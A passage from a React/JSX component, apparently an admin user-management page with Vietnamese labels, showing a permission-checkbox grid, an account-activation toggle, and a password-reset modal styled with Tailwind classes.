                    >
                      Chọn tất cả
                    </button>
                    <span className="text-[#94a3b8]">•</span>
                    <button
                      type="button"
                      onClick={handleClearAllPermissions}
                      className="text-[#94a3b8] hover:text-rose-400 hover:underline"
                    >
                      Bỏ chọn
                    </button>
                  </div>
                </div>

                {Object.entries(permissionGroups).map(([groupName, perms]) => (
                  <div key={groupName} className="space-y-2">
                    <div className="text-[11px] font-bold text-[#d4af37] uppercase tracking-wide border-b border-[#d4af37]/15 pb-1">
                      {groupName}
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                      {perms.map((p) => {
                        const checked = formData.permissions.includes(p.id);
                        return (
                          <label
                            key={p.id}
                            className={`flex items-start gap-2.5 p-2 rounded-lg border cursor-pointer transition-colors ${
                              checked
                                ? "bg-[#152236] border-[#d4af37]/50 text-white"
                                : "bg-[#0c1420] border-[#d4af37]/10 text-[#94a3b8] hover:border-[#d4af37]/30"
                            }`}
                          >
                            <input
                              type="checkbox"
                              checked={checked}
                              onChange={() => handleTogglePermission(p.id)}
                              className="mt-0.5 rounded border-[#d4af37] text-[#d4af37] focus:ring-0"
                            />
                            <div>
                              <div className="text-xs font-semibold leading-tight">{p.name}</div>
                              <div className="text-[10px] text-[#94a3b8] leading-tight mt-0.5">
                                {p.description}
                              </div>
                            </div>
                          </label>
                        );
                      })}
                    </div>
                  </div>
                ))}
              </div>

              {/* Status Toggle */}
              <div className="flex items-center justify-between p-3.5 bg-[#111c2e] rounded-xl border border-[#d4af37]/20">
                <div>
                  <span className="text-xs font-bold text-white block">Kích Hoạt Tài Khoản</span>
                  <span className="text-[11px] text-[#94a3b8]">
                    Tài khoản có thể đăng nhập ngay sau khi lưu
                  </span>
                </div>
                <input
                  type="checkbox"
                  checked={formData.isActive}
                  onChange={(e) => setFormData({ ...formData, isActive: e.target.checked })}
                  className="w-5 h-5 rounded text-[#d4af37] focus:ring-0 border-[#d4af37]/40"
                />
              </div>

              {/* Modal Actions */}
              <div className="pt-2 flex items-center justify-end gap-3 border-t border-[#d4af37]/20">
                <button
                  type="button"
                  onClick={() => setModalMode(null)}
                  className="px-4 py-2 bg-[#152236] hover:bg-[#1d2f4a] text-[#94a3b8] hover:text-white rounded-xl text-xs font-semibold"
                >
                  Hủy Bỏ
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="px-6 py-2 bg-gradient-to-r from-[#d4af37] to-[#e5b869] text-[#070c14] font-bold text-xs uppercase tracking-wider rounded-xl shadow-lg hover:brightness-110 disabled:opacity-50"
                >
                  {submitting ? "Đang lưu..." : modalMode === "CREATE" ? "Tạo Tài Khoản" : "Lưu Thay Đổi"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* PASSWORD RESET MODAL */}
      {passwordModalUser && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-[#0c1420] border border-[#d4af37]/40 rounded-2xl w-full max-w-md p-6 shadow-2xl space-y-5">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-blue-500/20 border border-blue-500/40 text-blue-400 flex items-center justify-center">
                <KeyRound className="w-5 h-5" />
              </div>
              <div>
                <h3 className="font-serif font-bold text-base text-white">Đặt Lại Mật Khẩu</h3>
                <p className="text-[11px] text-[#94a3b8]">
                  Tài khoản: <span className="text-[#d4af37] font-semibold">{passwordModalUser.name}</span> (
                  {passwordModalUser.email})
                </p>
              </div>
            </div>

            <form onSubmit={handleSubmitPassword} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-[#f1f5f9] mb-1.5">
                  Mật Khẩu Mới <span className="text-rose-400">*</span>
                </label>
                <input
                  type="password"
                  required
                  placeholder="Tối thiểu 6 ký tự"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  className="w-full px-3.5 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-[#d4af37]"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-[#f1f5f9] mb-1.5">
                  Xác Nhận Mật Khẩu Mới <span className="text-rose-400">*</span>
                </label>
                <input
                  type="password"
                  required
                  placeholder="Nhập lại mật khẩu mới"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className="w-full px-3.5 py-2.5 bg-[#111c2e] border border-[#d4af37]/20 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-[#d4af37]"
                />
              </div>

              <div className="flex items-center justify-end gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setPasswordModalUser(null)}
                  className="px-4 py-2 bg-[#152236] hover:bg-[#1d2f4a] text-[#94a3b8] hover:text-white rounded-xl text-xs font-semibold"
                >
                  Hủy
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="px-5 py-2 bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold text-xs uppercase tracking-wider rounded-xl shadow-lg disabled:opacity-50"
                >
                  {submitting ? "Đang xử lý..." : "Cập Nhật Mật Khẩu"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
